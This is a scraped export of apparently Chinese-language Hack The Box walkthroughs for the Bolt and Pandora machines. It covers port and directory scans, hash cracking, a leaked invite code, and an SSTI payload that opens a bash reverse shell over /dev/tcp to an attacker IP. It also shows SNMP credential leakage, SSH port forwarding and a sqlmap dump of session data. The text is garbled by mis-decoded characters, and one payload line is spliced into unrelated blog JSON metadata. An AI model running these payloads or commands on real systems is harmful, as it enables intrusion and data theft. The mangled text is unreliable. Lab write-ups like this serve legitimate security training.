OS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 23/tcp) HOP RTT ADDRESS 1 266.28 ms bogon (10.10.14.1) 2 266.96 ms bogon (10.10.11.114) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 237.89 seconds é¦–å…ˆå»çœ‹çœ‹80ç«¯å£çš„httpæœåŠ¡ æ·»åŠ åˆ°hosts â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# echo 10.10.11.114 bolt.htb &gt;&gt; /etc/hosts è¿™é‡Œæœ‰ä¸ªç™»å½•æŒ‰é’®ï¼Œè¿›å»çœ‹çœ‹ å°è¯•ä¸‹æœ‰æ²¡æœ‰å¼±å£ä»¤ ä½¿ç”¨adminè´¦æˆ·è¿›è¡Œç™»å½•ï¼Œæç¤ºçš„æ˜¯å¯†ç é”™è¯¯ï¼Œé‚£æ˜¯ä¸æ˜¯å¯ä»¥çˆ†ç ´è´¦å·å‘¢ï¼Ÿç”¨admin1æµ‹è¯•ä¸€ä¸‹ æ˜¯çš„ï¼Œæç¤ºå®Œå…¨ä¸ä¸€æ ·ï¼Œç›®å‰å¯ä»¥ç¡®å®šadminè´¦å·å­˜åœ¨äº† å°è¯•æ³¨å†Œè´¦å·å´æç¤º500ï¼Œå»æ‰«ä¸ªç›®å½•è¯•è¯• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://10.10.11.114/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.114/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ contact [Status: 200, Size: 26293, Words: 10060, Lines: 468] logout [Status: 302, Size: 209, Words: 22, Lines: 4] login [Status: 200, Size: 9287, Words: 2135, Lines: 173] register [Status: 200, Size: 11038, Words: 3053, Lines: 199] download [Status: 200, Size: 18570, Words: 5374, Lines: 346] services [Status: 200, Size: 22443, Words: 7170, Lines: 405] pricing [Status: 200, Size: 31731, Words: 11055, Lines: 549] sign-up [Status: 200, Size: 11038, Words: 3053, Lines: 199] sign-in [Status: 200, Size: 9287, Words: 2135, Lines: 173] [Status: 200, Size: 30347, Words: 10870, Lines: 505] check-email [Status: 200, Size: 7331, Words: 1224, Lines: 147] :: Progress: [20116/20116] :: Job [1/1] :: 61 req/sec :: Duration: [0:03:19] :: Errors: 0 :: éƒ½æµ‹è¯•äº†ä¸€éï¼Œæš‚æ—¶æ²¡ä»€ä¹ˆæ€è·¯ï¼Œä¸è¿‡sign-upå’Œsign-iné¡µé¢ä¼šæç¤º405ï¼Œæ„Ÿè§‰æ˜¯è¢«ä»€ä¹ˆä¸œè¥¿è¿‡æ»¤äº†ï¼Œå…ˆæ”¾ç€ä¸ç®¡ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–æ€è·¯å§ åœ¨&#x2F;downloadç›®å½•ä¸‹ï¼Œå’±ä»¬å¯ä»¥ä¸‹è½½ä¸€ä¸ªå‹ç¼©æ–‡ä»¶image.tar æŠŠå®ƒä¸‹è½½ä¸‹æ¥çœ‹çœ‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/image] â””â”€# ls -la æ€»ç”¨é‡ 64 drwxr-xr-x 13 root root 4096 1æœˆ 6 01:03 . drwxr-xr-x 4 root root 4096 1æœˆ 6 01:03 .. drwxr-xr-x 2 root root 4096 3æœˆ 5 2021 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950 drwxr-xr-x 2 root root 4096 3æœˆ 5 2021 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c drwxr-xr-x 2 root root 4096 3æœˆ 5 2021 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa drwxr-xr-x 2 root root 4096 3æœˆ 5 2021 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab drwxr-xr-x 2 root root 4096 3æœˆ 5 2021 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162 drwxr-xr-x 2 root root 4096 3æœˆ 5 2021 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b drwxr-xr-x 2 root root 4096 3æœˆ 5 2021 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad drwxr-xr-x 2 root root 4096 3æœˆ 5 2021 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf -rw-r--r-- 1 root root 3797 3æœˆ 5 2021 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json drwxr-xr-x 2 root root 4096 3æœˆ 5 2021 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77 drwxr-xr-x 3 root root 4096 1æœˆ 6 01:03 a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2 drwxr-xr-x 2 root root 4096 3æœˆ 5 2021 d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26 -rw-r--r-- 1 root root 1002 12æœˆ 31 1969 manifest.json -rw-r--r-- 1 root root 119 12æœˆ 31 1969 repositories ä¸‹è½½ä¸‹æ¥è§£å‹åï¼Œä¼šæœ‰å¾ˆå¤šæ–‡ä»¶ï¼Œåœ¨å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶å¤¹a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2ä¸­çš„layer.taré‡Œï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªæ–‡ä»¶db.sqlite3 â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer] â””â”€# ls -la æ€»ç”¨é‡ 32 drwxr-xr-x 4 root root 4096 1æœˆ 6 01:03 . drwxr-xr-x 3 root root 4096 1æœˆ 6 01:03 .. -rw-r--r-- 1 root root 16384 3æœˆ 5 2021 db.sqlite3 drwx------ 2 root root 4096 3æœˆ 5 2021 root drwxrwxrwt 2 root root 4096 3æœˆ 5 2021 tmp ä½¿ç”¨sqlite3æŸ¥çœ‹ä¸€ä¸‹æ•°æ®åº“ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/image] â””â”€# sqlite3 a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer/db.sqlite3 1 âš™ SQLite version 3.34.1 2021-01-20 14:10:07 Enter &quot;.help&quot; for usage hints. sqlite&gt; .table User sqlite&gt; select * from user; 1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.|| å¾—åˆ°äº†ä¸€ä¸ªè´¦å·ï¼Œé‚®ç®±ï¼Œä»¥åŠä¸€ç©¿å¯†ç hash ä½¿ç”¨johnçˆ†ç ´ä¸€ä¸‹å¯†ç  â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot; Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3]) Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status deadbolt (?) 1g 0:00:00:01 DONE (2022-01-06 01:11) 0.6451g/s 111483p/s 111483c/s 111483C/s debie..curtis13 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed ç°åœ¨å¾—åˆ°äº†è´¦å·å¯†ç  username = admin password = deadbolt email = admin@bolt.htb æ‹¿ç€è´¦å·å¯†ç å»ç™»å½•åå° åœ¨é¦–é¡µçš„ä½ç½®ï¼Œæœ‰ä¸€ä¸ªåœ¨çº¿èŠå¤©çª—å£ï¼Œæˆ‘æ„Ÿè§‰åº”è¯¥æ˜¯æœ‰XSSæ²¡è·‘ åœ¨èŠå¤©å†…å®¹ä¸­æåˆ°äº†æœ‰å…¶ä»–ä¸»æœºï¼Œé‚£å°±æ‰¾ä¸€ä¸‹å§ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ° â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u &quot;http://bolt.htb&quot; -H &quot;Host:FUZZ.bolt.htb&quot; -fs 30347 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://bolt.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.bolt.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 30347 ________________________________________________ demo [Status: 302, Size: 219, Words: 22, Lines: 4] mail [Status: 200, Size: 4943, Words: 345, Lines: 99] lists [Status: 200, Size: 0, Words: 1, Lines: 1] videos [Status: 200, Size: 0, Words: 1, Lines: 1] disco [Status: 200, Size: 0, Words: 1, Lines: 1] :: Progress: [4989/4989] :: Job [1/1] :: 35 req/sec :: Duration: [0:02:34] :: Errors: 0 :: å‘ç°ä¸¤ä¸ªå¯ç”¨å­åŸŸådemoå’Œmailï¼Œç»™ä»–ä»¬åŠ å…¥åˆ°hostsé‡Œ echo 10.10.11.114 demo.bolt.htb mail.bolt.htb &gt;&gt; /etc/hosts åœ¨demoè¿™ä¸€ä¸ªé¡µé¢é‡Œå‘ç°æœ‰æ–°çš„æ³¨å†Œç‚¹ï¼Œå¯ä»¥è¿›è¡Œæ³¨å†Œï¼Œä½†æ˜¯ç¼ºå°‘äº†ä¸€ä¸ªé‚€è¯·ç  â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/image] â””â”€# grep -iR -A 2 &#39;invite_code&#39; 2&gt;/dev/null -- 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html: {{ form.invite_code(placeholder=\"Invite Code\", class=\"form-control\") }} 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html- &lt;div class=&quot;input-group-append&quot;&gt; 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html- &lt;div class=&quot;input-group-text&quot;&gt; -- 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/forms.py: invite_code = TextField(&#39;Invite Code&#39;, id=&#39;invite_code&#39; , validators=[DataRequired()]) -- 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py: code = request.form[&#39;invite_code&#39;] 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py- if code != &#39;XNSS-HSJW-3NGU-8XTJ&#39;: 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py- return render_template(&#39;code-500.html&#39;) æ˜¾ç¤ºé‚€è¯·ç åœ¨41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad&#x2F;app&#x2F;base&#x2F;routes.pyä¸­ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹ if code != &#39;XNSS-HSJW-3NGU-8XTJ&#39;: æ‰¾åˆ°é‚€è¯·ç ï¼Œå»æ³¨å†Œä¸€ä¸ªè´¦å· æ³¨å†Œåç™»å½•å³å¯ï¼Œæ–°æ³¨å†Œçš„è´¦å·åœ¨demoå’Œmailä¸Šéƒ½å¯ä»¥è¿›è¡Œç™»å½• åœ¨settingå¤„çš„nameé‡Œï¼Œå­˜åœ¨ä¸€ä¸ªSSTIï¼Œè¿™é‡Œæµ‹è¯•ä¸€ä¸‹ ä¿®æ”¹åæ”¶åˆ°äº†é‚®ä»¶ ç‚¹å‡»é“¾æ¥ç¡®è®¤åï¼Œä»ªè¡¨ç›˜ä¸Šæ²¡æœ‰ä»»ä½•å˜åŒ–ï¼Œä½†æ˜¯å´æ”¶åˆ°äº†å¦ä¸€å°é‚®ä»¶ï¼Œé‡Œé¢æ˜¾ç¤ºäº†æˆ‘ä»¬è¾“å…¥çš„ç»“æœ ç¡®è®¤å­˜åœ¨SSTI https://github.com/swisskyrepo/PayloadsAllTheThings/blob/add722d1c27d90f15d313e8846e5a0f8b36a403a/Server Side Template Injection/README.md#exploit-the-ssti-by-calling-ospopenread ä½¿ç”¨è¯¥pocè¿›è¡Œåˆ©ç”¨ æˆåŠŸæ‰§è¡Œå‘½ä»¤ ç°åœ¨æ„é€ ä¸€ä¸ªpocæ¥è·å¾—ä¸€ä¸ªshell {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('/bin/bash -c \"/bin/bash -i &>/dev/tcp/10.10.14.16/4444","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Pandora - Hackthebox","slug":"Hackthebox - Pandora","date":"2022-01-08T11:38:36.000Z","updated":"2023-05-20T02:42:30.000Z","comments":true,"path":"2022/01/08/Hackthebox - Pandora/","link":"","permalink":"http://www.lucifiel.com/2022/01/08/Hackthebox%20-%20Pandora/","excerpt":"","text":"Hackthebox - Pandoraé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.136 Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-17 02:29 EST Nmap scan report for 10.10.11.136 Host is up (0.22s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Play | Landing No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=1/17%OT=22%CT=1%CU=41376%PV=Y%DS=2%DC=T%G=Y%TM=61E51AF OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=C)SEQ OS:(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O OS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2= OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSN OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 256/tcp) HOP RTT ADDRESS 1 238.86 ms 10.10.14.1 2 239.01 ms 10.10.11.136 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 59.77 seconds å°†DNSè§£ææ·»åŠ åˆ°hosts echo 10.10.11.136 pandora.htb &gt;&gt; /etc/hosts ç„¶åå»çœ‹ä¸€ä¸‹80ç«¯å£ åœ¨é¡µé¢ä¸Šæ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œfuzzä¸‹ç›®å½•çœ‹çœ‹å§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://pandora.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://pandora.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ assets [Status: 301, Size: 311, Words: 20, Lines: 10] server-status [Status: 403, Size: 276, Words: 20, Lines: 10] [Status: 200, Size: 33560, Words: 13127, Lines: 908] :: Progress: [20116/20116] :: Job [1/1] :: 119 req/sec :: Duration: [0:03:26] :: Errors: 0 :: ä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œæœ‰ç‚¹è¿·æƒ‘ æ‰«æä¸ªUDPç«¯å£çœ‹çœ‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sC -sV -sU -top-ports=20 pandora.htb 130 â¨¯ Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-17 20:30 EST Nmap scan report for pandora.htb (10.10.11.136) Host is up (0.27s latency). PORT STATE SERVICE VERSION 53/udp closed domain 67/udp open|filtered dhcps 68/udp open|filtered dhcpc 69/udp closed tftp 123/udp open|filtered ntp 135/udp closed msrpc 137/udp open|filtered netbios-ns 138/udp open|filtered netbios-dgm 139/udp open|filtered netbios-ssn 161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public) | snmp-info: | enterprise: net-snmp | engineIDFormat: unknown | engineIDData: 48fa95537765c36000000000 | snmpEngineBoots: 30 |_ snmpEngineTime: 20m46s | snmp-processes: | 1: | | 2: | | 3: | |_ 4: | snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 |_ System uptime: 20m46.36s (124636 timeticks) |_snmp-win32-software: 162/udp open|filtered snmptrap 445/udp open|filtered microsoft-ds 500/udp open|filtered isakmp 514/udp open|filtered syslog 520/udp closed route 631/udp closed ipp 1434/udp open|filtered ms-sql-m 1900/udp open|filtered upnp 4500/udp open|filtered nat-t-ike 49152/udp open|filtered unknown Service Info: Host: pandora Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 135.89 seconds è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªsnmpå¼€ç€ï¼Œè€Œä¸”æ˜æ˜¾è¿˜æœ‰ä¿¡æ¯æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥ï¼Œæˆ‘æ„Ÿè§‰è¿™å°±æ˜¯çªç ´å£ æ¼æ´åˆ©ç”¨ä½¿ç”¨snmpwalkæ‰«æä¸€ä¸‹pandora.htb snmpwalk -v 2c pandora.htb -c public &gt; nmap iso.3.6.1.2.1.25.4.2.1.5.870 = STRING: &quot;-c sleep 30; /bin/bash -c &#39;/usr/bin/host_check -u daniel -p HotelBabylon23&#39;&quot; å¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç  username = daniel password = HotelBabylon23 å»sshç™»å½•è¯•è¯• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh daniel@pandora.htb daniel@pandora.htb&#39;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 18 Jan 01:47:00 UTC 2022 System load: 0.12 Processes: 263 Usage of /: 64.4% of 4.87GB Users logged in: 1 Memory usage: 12% IPv4 address for eth0: 10.10.11.136 Swap usage: 0% =&gt; /boot is using 91.8% of 219MB 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Jan 18 01:12:05 2022 from 10.10.14.20 daniel@pandora:~$ whoami&amp;&amp;id daniel uid=1001(daniel) gid=1001(daniel) groups=1001(daniel) æˆåŠŸç™»å½• daniel@pandora:~$ cd ../ daniel@pandora:/home$ ls daniel matt daniel@pandora:/home$ cd matt daniel@pandora:/home/matt$ ls LinEnum.sh snmp-mibs-downloader snmp-mibs-downloader_1.2.tar.xz user.txt daniel@pandora:/home/matt$ cat user.txt cat: user.txt: Permission denied è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€ä¸ªmattè´¦æˆ·ï¼Œå¹¶ä¸”æˆ‘ä»¬æ²¡æœ‰æƒé™è®¿é—®user.txtçš„flagæ–‡ä»¶ï¼Œé‚£å°±æ˜¯å¾—æƒ³åŠæ³•ææƒåˆ°mattç”¨æˆ· æƒé™æå‡MattæŸ¥çœ‹ä¸€ä¸‹ç«¯å£ daniel@pandora:/home/matt$ netstat -tuplen (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State User Inode PID/Program name tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN 101 21170 - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 0 24732 - tcp 0 0 0.0.0.0:5577 0.0.0.0:* LISTEN 1000 119305 - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN 114 24400 - tcp6 0 0 :::22 :::* LISTEN 0 24759 - tcp6 0 0 :::80 :::* LISTEN 0 24585 - udp 0 0 127.0.0.53:53 0.0.0.0:* 101 21169 - udp 0 0 0.0.0.0:161 0.0.0.0:* 0 24804 - udp6 0 0 ::1:161 :::* 0 24805 - è¿™é‡Œå¥½åƒæœ‰æœ¬åœ°ç½‘ç»œæœåŠ¡pandoraï¼ŒæŸ¥çœ‹ä¸€ä¸‹ daniel@pandora:/home/matt$ curl pandora.htb &lt;meta HTTP-EQUIV=&quot;REFRESH&quot; content=&quot;0; url=/pandora_console/&quot;&gt; ç¡®å®å­˜åœ¨ï¼Œä½¿ç”¨sshæŠŠç«¯å£è½¬å‘å‡ºæ¥ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh -L 80:127.0.0.1:80 daniel@pandora.htb daniel@pandora.htb&#39;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 18 Jan 01:54:11 UTC 2022 System load: 0.0 Processes: 273 Usage of /: 64.6% of 4.87GB Users logged in: 1 Memory usage: 19% IPv4 address for eth0: 10.10.11.136 Swap usage: 0% =&gt; /boot is using 91.8% of 219MB 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Jan 18 01:47:01 2022 from 10.10.14.17 ä»£ç†æˆåŠŸï¼Œæˆ‘ä»¬å»è®¿é—®ä¸€ä¸‹127.0.0.1 è¿™é‡Œå‘ç°äº†ä¸€ä¸ªå…³é”®çº¿ç´¢v7.0NG.742_FIX_PERL2020 å»æœç´¢ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬æœ‰æ²¡æœ‰æ¼æ´ https://nvd.nist.gov/vuln/detail/CVE-2020-26518#range-6019001 æ‰¾åˆ°äº†ä¸€ä¸ªsqlæ³¨å…¥ï¼Œå’±ä»¬å»æ³¨å…¥å§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# sqlmap -u &quot;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1&quot; --batch --dbms=mysql -D pandora -T tsessions_php -C id_session,data --dump +----------------------------+------------------------------------------------------+ | id_session | data | +----------------------------+------------------------------------------------------+ | 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:&quot;daniel&quot;; | | 0ahul7feb1l9db7ffp8d25sjba | NULL | | 1um23if7s531kqf5da14kf5lvm | NULL | | 22eqdjecn219cpni093reba8ee | NULL | | 27ffs3tj8rpvrm2hd0juphhda7 | id_usuario|s:6:&quot;daniel&quot;; | | 2e25c62vc3odbppmg6pjbf9bum | NULL | | 2uibrnof5j1k45g9u15tngrlju | NULL | | 346uqacafar8pipuppubqet7ut | id_usuario|s:6:&quot;daniel&quot;; | | 3me2jjab4atfa5f8106iklh4fc | NULL | | 4f51mju7kcuonuqor3876n8o02 | NULL | | 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:&quot;daniel&quot;; | | 59qae699l0971h13qmbpqahlls | NULL | | 5fihkihbip2jioll1a8mcsmp6j | NULL | | 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:&quot;daniel&quot;; | | 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:&quot;daniel&quot;; | | 6ctchv9r2gg7c6arpv4cipcfol | NULL | | 81f3uet7p3esgiq02d4cjj48rc | NULL | | 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:&quot;daniel&quot;; | | 8upeameujo9nhki3ps0fu32cgd | NULL | | 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:&quot;daniel&quot;; | | a3a49kc938u7od6e6mlip1ej80 | NULL | | agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:&quot;daniel&quot;; | | cbo2bdg3g7vfqgjmcuc75bq0aj | NULL | | cojb6rgubs18ipb35b3f6hf0vp | NULL | | cor29cq7l3ae4g8a423as7p422 | id_usuario|s:5:&quot;admin&quot;;alert_msg|a:0:{}new_chat|b:0; | | d0carbrks2lvmb90ergj7jv6po | NULL | | dsot94harh6hraanl60m698enq | NULL | | e58oalliogbu7jb1dc75dos90j | id_usuario|s:5:&quot;admin&quot;;alert_msg|a:0:{}new_chat|b:0; | | f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:&quot;daniel&quot;; | | fikt9p6i78no7aofn74rr71m85 | NULL | | fqd96rcv4ecuqs409n5qsleufi | NULL | | g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:&quot;daniel&quot;; | | g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:&quot;matt&quot;;alert_msg|a:0:{}new_chat|b:0; | | gf40pukfdinc63nm5lkroidde6 | NULL | | heasjj8c48ikjlvsf1uhonfesv | NULL | | hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:&quot;daniel&quot;; | | idlkl6lfsk05omgp2t42b8rlq9 | id_usuario|s:6:&quot;daniel&quot;; | | j4415tiqm7kck5lkovi4qocch9 | NULL | | 